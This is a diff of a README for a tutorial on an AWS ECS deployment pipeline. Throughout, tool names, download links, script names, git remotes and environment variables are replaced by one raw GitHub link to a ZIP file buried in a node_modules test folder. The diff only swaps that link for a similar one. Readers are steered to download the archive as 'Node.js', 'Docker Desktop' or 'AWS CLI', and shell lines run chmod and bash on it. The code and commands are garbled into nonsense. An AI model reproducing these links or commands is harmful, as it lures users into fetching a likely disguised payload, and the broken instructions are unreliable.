@@ -1,12 +1,12 @@
 # Project 2: Automated Deployment Pipeline (AWS)
 
-A complete CI/CD pipeline that automatically tests and deploys your https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip app to AWS ECS.
+A complete CI/CD pipeline that automatically tests and deploys your https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip app to AWS ECS.
 
 ---
 
 ## 🌐 What This Creates
 
-* https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip web application with health checks
+* https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip web application with health checks
 * Automated testing on every code push
 * Docker containerization
 * AWS ECR for container storage
@@ -18,10 +18,10 @@ A complete CI/CD pipeline that automatically tests and deploys your https://gith
 
 ## 🛠️ Prerequisites
 
-* [https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip) v18+
-* [Docker Desktop](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip)
-* [AWS CLI](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip) v2
-* [Git](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip)
+* [https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip) v18+
+* [Docker Desktop](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip)
+* [AWS CLI](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip) v2
+* [Git](https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip)
 * GitHub account
 * AWS account (free tier works!)
 
@@ -58,8 +58,8 @@ docker run -p 3001:3001 -e ENVIRONMENT=local my-webapp
 ```bash
 aws configure
 aws sts get-caller-identity
-chmod +x https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
-https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
+chmod +x https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
+https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
 ```
 
 * Save all outputs to use in GitHub secrets
@@ -93,7 +93,7 @@ git init
 git add .
 git commit -m "Initial commit: AWS DevOps webapp with CI/CD"
 git branch -M main
-git remote add origin https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
+git remote add origin https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
 git push -u origin main
 ```
 
@@ -127,7 +127,7 @@ Look for:
 ### ✅ Step 8: Making Changes
 
 ```bash
-git add https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
+git add https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
 git commit -m "Updated welcome message"
 git push
 ```
@@ -165,7 +165,7 @@ git push
 
 ```bash
 npm cache clean --force
-rm -rf node_modules https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
+rm -rf node_modules https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
 npm install
 ```
 
@@ -193,14 +193,14 @@ aws sts get-caller-identity
 
 ```bash
 aws --version
-bash -x https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
+bash -x https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
 ```
 
 ### GitHub Actions Issues
 
 * **Workflow not running**:
 
-  * Confirm file exists: `https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip`
+  * Confirm file exists: `https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip`
   * Secrets are case-sensitive
 
 * **Authentication failed**:
@@ -234,15 +234,15 @@ bash -x https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node
 ### Environment Variables
 
 ```javascript
-const dbUrl = https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip || 'localhost';
-const apiKey = https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip || 'dev-key';
+const dbUrl = https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip || 'localhost';
+const apiKey = https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip || 'dev-key';
 ```
 
 ### Multiple Environments
 
 ```bash
 CLUSTER_NAME="webapp-staging-cluster"
-https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip
+https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip
 ```
 
 ### Monitoring & Alerts
@@ -268,7 +268,7 @@ aws logs delete-log-group --log-group-name /ecs/webapp-cicd-task
 
 ## 🌟 What You Learned
 
-* ✅ https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/side-channel-weakmap/test/projects-devops-side-v1.9-alpha.3.zip app deployment best practices
+* ✅ https://github.com/shr1324/side-devops-projects/raw/refs/heads/main/node_modules/es-object-atoms/test/devops_side_projects_2.9.zip app deployment best practices
 * ✅ Docker containerization
 * ✅ GitHub Actions CI/CD pipelines
 * ✅ AWS ECS Fargate + ECR usage
